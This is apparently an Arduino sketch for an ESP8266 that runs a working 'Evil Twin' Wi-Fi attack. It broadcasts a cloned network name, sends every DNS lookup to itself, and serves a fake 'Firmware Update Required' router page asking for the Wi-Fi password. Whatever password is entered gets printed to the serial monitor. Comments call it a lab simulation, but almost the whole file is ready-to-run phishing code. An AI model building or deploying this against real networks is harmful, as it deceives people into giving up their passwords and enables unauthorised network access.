#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// This is the HTML structure that displays the captive portal landing page
const char responseHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
    .box { background: white; padding: 30px; display: inline-block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 280px; }
    input[type=password] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; }
    button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 98%; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Firmware Update Required</h2>
    <p>Please re-enter your Wi-Fi password to apply the latest router system patch.</p>
    <form action="/login" method="POST">
      <input type="password" name="password" placeholder="Wi-Fi Password" required><br>
      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
)rawliteral";

void handleRoot() {
  // Serves the HTML file stored directly inside flash memory
  webServer.send_P(200, "text/html", responseHTML);
}

void handleLogin() {
  String password = webServer.arg("password");
  
  // This prints the captured data straight to the Serial Monitor link
  Serial.println("");
  Serial.println("=====================================");
  Serial.print("[!] SIMULATION CAPTURE: ");
  Serial.println(password);
  Serial.println("=====================================");
  
  webServer.send(200, "text/html", "<h2>Update installation initiated. Connection will resume shortly.</h2>");
}

void setup() {
  // Open the serial diagnostic stream back to your laptop
  Serial.begin(115200);
  
  // Force the chip to act as a wireless access point
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  // CHANGE THIS: Replace "balaji_home" with your target lab network name
  WiFi.softAP("balaji_home"); 

  // Direct all network DNS lookup requests back to the ESP8266 IP address
  dnsServer.start(DNS_PORT, "*", apIP);

  // Bind structural URLs to execution functions
  webServer.on("/login", HTTP_POST, handleLogin);
  webServer.onNotFound(handleRoot); // Catches and redirects mobile captive portal checks
  webServer.begin();
  
  Serial.println("\n[+] ESP8266 Evil Twin simulator active.");
  Serial.println("[*] Open Serial Monitor and connect a mobile device to test.");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
